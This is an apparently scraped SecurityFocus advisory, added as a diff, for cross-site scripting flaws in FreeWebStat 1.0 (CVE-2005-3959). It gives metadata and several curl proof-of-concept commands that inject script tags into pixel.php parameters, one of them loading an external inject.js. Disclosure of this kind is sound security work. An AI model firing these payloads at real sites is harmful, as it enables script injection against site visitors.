@@ -1,0 +1,97 @@
+#SpeeDr00t@Black Falcon<br>#bid15601<p><b><span style="font-size: 18pt;">FreeWebStat Multiple Cross-Site Scripting Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/15601/info">info</a><br><a href="http://www.securityfocus.com/bid/15601/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/15601/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/15601/solution">solution</a><br><a href="http://www.securityfocus.com/bid/15601/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				15601
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2005-3959<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Nov 28 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Nov 28 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Francesco Ongaro is credited with the discovery of this vulnerability.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					FreeWebStat FreeWebStat 1.0 rev37<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	No exploit is required.<br/><br/>curl "http://www.example.com/fws/pixel.php"<br/>domain=&lt;script&gt;alert(1)&lt;/script&gt;<br/>&amp;site=&lt;script&gt;alert(2)&lt;/script&gt;<br/>&amp;jsref=&lt;script&gt;alert(3)&lt;/script&gt;<br/>&amp;jsres=&lt;script&gt;alert(4)&lt;/script&gt;<br/>&amp;jscolor=&lt;script&gt;alert(5)&lt;/script&gt;?<br/>-A "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; (R1 1.3))"<br/>-e "http://www.example.com"<br/><br/>curl "http://www.example.com/fws/pixel.php"<br/>domain=ush.it&amp;site=aa&amp;jsref=http://www.example.com&amp;jsres=1337&amp;jscolor=red?<br/>-e "http://www.example.com/search?q=lello+splendor++&amp;hl=it&amp;lr=&amp;start=<br/>10&amp;sa=N? <br/>-A "Mozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.1; SV1; (R1 1.3))"<br/> <br/>curl "http://www.example.com/fws/pixel.php"<br/>domain=www.example.com&amp;site=aa&amp;jsref=http://www.example.com&amp;jsres=13<br/>37&amp;jscolor=red? -e "http://www.example.com" <br/>-A "Mozilla/4.0(compatible; MSIE 6.0; Windows NT 5.1; SV1; (R1 1.3))"<br/> <br/>curl "http://www.example.com/fws/pixel.php"<br/>domain=&lt;script&gt;alert(1)&lt;/script&gt;&amp;site=<br/>&lt;script&gt;alert(2)&amp;jsref=&lt;/script&gt;&lt;script&gt;alert(3)&lt;/script&gt;<br/>&amp;jsres=&lt;script&gt;alert(4)&lt;/script&gt;&amp;jscolor=<br/>&lt;script&gt;alert(5)&lt;/script&gt;?<br/>-A "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; (R1 1.3))"<br/>-e "http://www.example.com"<br/><br/><br/>curl http://www.example.com/fws/pixel.php?site=<br/>&amp;jsres=&amp;jscolor=&amp;jsref=http://www.example.com/search?<br/>q=ppoopp&lt;script language=?javascript?-src=<br/>"http://www.example.com/fws/inject.js?&gt;&lt;/script&gt;&amp;hl=it"
+	
+		<ul>
+</ul>
+</div>
